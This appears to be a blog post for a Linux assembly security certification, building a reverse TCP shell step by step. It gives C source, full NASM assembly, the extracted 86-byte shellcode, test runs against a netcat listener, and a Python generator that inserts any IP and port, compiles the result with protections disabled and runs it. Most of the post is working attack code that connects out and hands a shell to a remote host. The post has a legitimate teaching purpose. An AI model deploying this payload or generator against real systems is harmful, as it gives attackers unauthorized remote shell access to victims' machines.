# Assignment #2: Reverse Bind TCP 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Create a Shell_Reverse_TCP shellcode
    - Reverse connects to configured IP and Port
    - Execs Shell on successful connection
- IP and Port number should be easily configurable


### Solution

In the last assignment (#1) I created a *bind tcp shellcode*, the socket was created as a server socket, in this assignment I need to create a client socket. Now we will see how I did it. Like in the last assignment, first, I create the client socket in C language.


The methods involved on it:

- socket:   Create an endpoint for communication and return a file descriptor 
- connect:  Connect the socket to a port and address given.
- dup2:     Duplicate the file descriptor, used for set stdin, stdout and sterr to the new file descritor (returned from accept)   
- execve:   Execute a program (our purpose /bin/sh)



```C
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc, char *argv[]){

        // AF_INET = 2;         SOCK_STREAM = 1
        int fd = 0;
        fd = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr_in serv_addr; 
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = inet_addr("192.168.1.64");
        serv_addr.sin_port = htons(4444); 

        connect(fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 

        // redirect stdin, stdout, stderr
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2); 

        // run program
        execve("/bin/sh", NULL, NULL);

}
```


We compile, run and test it to check if It is working...


Client:
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ gcc reverse-shell-tcp.c -o reverse-shell-tcp
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ ./reverse-shell-tcp 
```

Server:
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ nc -lvp 4444
listening on [any] 4444 ...
192.168.1.64: inverse host lookup failed: Unknown host
connect to [192.168.1.64] from (UNKNOWN) [192.168.1.64] 36002
id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
```

After, I start to do same in assembly language. But before we need to know what are the numbers of the involved system calls.


| Method        | System call  | Socket syscall           | Description  |
| ------------- |:-------------:| :--------------:|-----------:|
| socket        | 0x66 (102) | 1 (SYS_SOCKET)          | Create a socket |
| connect      | 0x66 (102) |  3 (SYS_CONNECT)   |   Connect a socket |
| dup2      | 0x3f (63)  | None    |   Duplicate the file descriptors |
| execve      | 0xb (11)  | None    |   Execute a program |


System syscalls:  /usr/include/i386-linux-gnu/asm/unistd_32.h

Socket syscalls: /usr/include/linux/net.h 

Socket protocols: /usr/include/i386-linux-gnu/bits/socket.h

Socket domains: /usr/include/netinet/in.h

Socket types: /usr/include/i386-linux-gnu/bits/socket_type.h


#### Create the socket
```c
int socket(int domain, int type, int protocol);
```

The domain will be **IPv4 Internel Protocol**, the type (of communication) **SOCK_STREAM** and the protocol.
Basically, we push the parameters in the stack and save the stack pointer in the ecx register, after we run the system call.



```nasm
        xor eax, eax
        xor ebx, ebx
        push eax                ; protocol      - 0
        push 1                  ; type          - SOCK_STREAM,
        push 2                  ; dominio       - AF_INET

        mov ecx, esp            ; arguments
        mov bl, 1               ; sys_socket (create)
        mov al, 102             ; systemcall
        int 0x80

        mov esi, eax            ; save sockfd
```

#### Connect the socket

```c
int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```

Connect the socket to an address and port.


```nasm
	xor ecx, ecx
	push 0x4001a8c0		; addr (192.168.1.64)
	push word 0x5c11	; Port 4444
	push word 2		; PF_INET
	mov ecx, esp		; save *addr in ecx
	
	push 0x10		; length addrlen=16
	push ecx		; &serv_addr
	push esi		; sockfd

	mov ecx, esp		; arguments
	mov al, 102		; systemcall
	mov bl, 3		; sys_connect
	int 0x80
```


After the connection is done, I duplicate the file descriptors to send all messages to the socket file descriptor.

#### Dup2

```c
int dup2(int oldfd, int newfd);
```

Duplicate the file descriptor, I did a loop to duplicate the three file descriptors (in, out and err) with the socket file descriptor.

```nasm
        mov ebx, eax            ; oldfd = clientfd
        xor ecx, ecx            ; ecx = newfd
loop:
        mov al, 0x3f            ; syscall dup2
        int 0x80
        inc ecx
        cmp ecx, 0x2
        jle loop
```


#### Execve
```c
int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

Simple exevce shellcode /bin/sh that use the stack.

```nasm
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
```


#### Final program


```nasm
global _start			

section .text
_start:
	; int socket(int domain, int type, int protocol);
	xor eax, eax
	xor ebx, ebx
	push eax		; protocol	- 0
	push 1			; type		- SOCK_STREAM,
	push 2			; dominio 	- AF_INET

	mov ecx, esp		; arguments
	mov bl, 1		; sys_socket
	mov al, 102		; systemcall
	int 0x80

	mov esi, eax		; save sockfd


	; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor ecx, ecx
	push 0x4001a8c0		; addr (192.168.1.64)
	push word 0x5c11	; Port 4444
	push word 2		; PF_INET
	mov ecx, esp		; save *addr in ecx
	
	push 0x10		; length addrlen=16
	push ecx		; &serv_addr
	push esi		; sockfd

	mov ecx, esp		; arguments
	mov al, 102		; systemcall
	mov bl, 3		; sys_connect
	int 0x80


	; int dup2(int oldfd, int newfd);	
	mov ebx, esi		; oldfd = clientfd
	xor ecx, ecx            ; ecx = newfd      
loop:
    	mov al, 0x3f           	; syscall dup2    
    	int 0x80
	inc ecx			
    	cmp ecx, 0x2
    	jle loop


	; execve stack-sh
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80	
```

It works...
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ ./compile.sh reverse-tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ objdump -d ./reverse-tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc0\xa8\x01\x40\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ vim shellcode.c 
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ ./shellcode 
Shellcode Length:  86

```

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment2$ nc -lvp 4444
listening on [any] 4444 ...
192.168.1.64: inverse host lookup failed: Unknown host
connect to [192.168.1.64] from (UNKNOWN) [192.168.1.64] 36003
id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
```


#### Generate a reverse TCP shellcode with configurable address and port

```python
#!/usr/bin/env python

import sys
import struct
import os
import binascii
import socket

def port2hex(port):
	return struct.pack(">H", port)


def address2hex(address):
	addr = binascii.hexlify(socket.inet_aton(address))
	return binascii.unhexlify("".join([addr[i:i+2] for i in range(0, len(addr), 2)]))
	

if __name__ == "__main__":
	if sys.argv[2] is not None:
		try:
			port = port2hex(int(sys.argv[2]))
			address = address2hex(sys.argv[1])
			port_check = [port.encode('hex')[i:i+2] for i in range(0, len(port.encode('hex')), 2)]
			address_check = [address.encode('hex')[i:i+2] for i in range(0, len(address.encode('hex')), 2)]
			nullbytes = False
			for i in port_check:
				if (i == "00"):
					print "[-] The port contains null bytes, use another port"
					nullbytes = True
			for i in address_check:
				if (i == "00"):
					print "[-] The address contains null bytes."
					nullbytes = True
			shellcode = "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68%s\x66\x68%s\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"%(address,port)
			sc = ""
			for c in bytearray(shellcode):
    				sc += "\\x%02x" % c
			shellcode_c = '#include<stdio.h>\n\
#include<string.h>\n\
unsigned char code[] = "%s";\n\
main(){\n\
printf("Shellcode Length: %%d\\n", strlen(code));\n\
int (*ret)() = (int(*)())code;\n\
ret();\n\
}'%sc
			with open("shellcode_tmp.c", "w") as f:
				f.write(shellcode_c)
			os.system("gcc shellcode_tmp.c -fno-stack-protector -z execstack -o shellcode")
			os.system("rm shellcode_tmp.c")
			if nullbytes:
				print "[+] Reverse TCP shellcode created with null bytes\n[+] Run ./shellcode"
			else:
				print "[+] Reverse TCP shellcode created\n[+] Run ./shellcode"
		except ValueError:
			print "[-] Port must be a number"
	else:
		print "usage: %prog <port> \nExample: ./%prog 192.168.1.64 4444"

```


